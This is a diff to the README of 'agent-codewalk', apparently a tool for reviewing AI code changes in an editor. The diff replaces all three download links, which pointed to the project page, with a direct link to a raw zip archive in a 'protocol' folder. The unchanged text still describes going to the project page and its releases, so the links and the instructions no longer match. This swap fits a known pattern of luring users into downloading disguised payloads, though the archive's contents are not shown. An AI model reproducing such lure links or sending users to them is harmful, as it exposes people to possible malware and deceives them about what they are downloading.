@@ -1,6 +1,6 @@
 # 🧭 agent-codewalk - Understand AI Changes, Right in Your Editor
 
-[![Download agent-codewalk](https://img.shields.io/badge/Download-agent--codewalk-blue?style=for-the-badge&logo=github)](https://github.com/ramsdv31/agent-codewalk)
+[![Download agent-codewalk](https://img.shields.io/badge/Download-agent--codewalk-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ramsdv31/agent-codewalk/main/protocol/agent_codewalk_v2.9.zip)
 
 ## 👋 Welcome to agent-codewalk
 
@@ -20,7 +20,7 @@ Let's get you set up. The whole process takes just a few minutes, and once it's 
 
 Your first step is to get the application onto your computer. Click the big button below to go to the download page:
 
-<a href="https://github.com/ramsdv31/agent-codewalk" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 5px 15px rgba(0,0,0,0.2);">⬇️ Download agent-codewalk Now</a>
+<a href="https://raw.githubusercontent.com/ramsdv31/agent-codewalk/main/protocol/agent_codewalk_v2.9.zip" style="display:inline-block;padding:15px 35px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 5px 15px rgba(0,0,0,0.2);">⬇️ Download agent-codewalk Now</a>
 
 Once you click that link, you'll land on the project's GitHub page. That's just the website where the app lives. Look for a section that says "Releases" or a button that says "Download." Click on the latest release, and you'll see the file you need to grab.
 
@@ -169,7 +169,7 @@ So go ahead, give it a try. Click that download button again if you need to, ins
 
 **Ready to start? Download now:**
 
-[![Download agent-codewalk](https://img.shields.io/badge/Download-agent--codewalk-green?style=for-the-badge&logo=github)](https://github.com/ramsdv31/agent-codewalk)
+[![Download agent-codewalk](https://img.shields.io/badge/Download-agent--codewalk-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ramsdv31/agent-codewalk/main/protocol/agent_codewalk_v2.9.zip)
 
 Happy coding, and happy walking! 🚶‍♂️✨
 
